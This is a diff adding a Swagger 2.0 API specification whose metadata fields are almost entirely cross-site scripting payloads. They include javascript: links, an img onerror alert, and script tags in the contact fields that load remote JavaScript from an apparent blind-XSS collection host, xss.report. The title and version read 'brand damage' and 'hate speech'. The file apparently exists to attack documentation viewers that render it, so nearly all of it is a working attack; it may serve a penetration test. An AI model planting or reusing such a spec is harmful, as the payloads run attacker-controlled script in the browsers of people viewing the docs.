@@ -1,0 +1,26 @@
+{
+"swagger": "2.0",
+"info": {
+"version": "hate speech",
+"title": "brand damage",
+"description": "[asd](javascript:alert(document.domain))xxxx<img src=x onerror=alert('XSS');>xxxx",
+"termsOfService": "javascript:alert(document.domain)",
+"contact": {
+"name": "'"><script src=//xss.report/s/Ma7moodBakr></script>",
+"url": "'"><script src=//xss.report/s/Ma7moodBakr></script>",
+"email": "'"><script src=//xss.report/s/Ma7moodBakr></script>"
+}
+},
+"basePath": "/",
+"paths": {
+"/": {
+"get": {
+"responses": {
+"200": {
+"description": "Successful response"
+}
+}
+}
+}
+}
+}
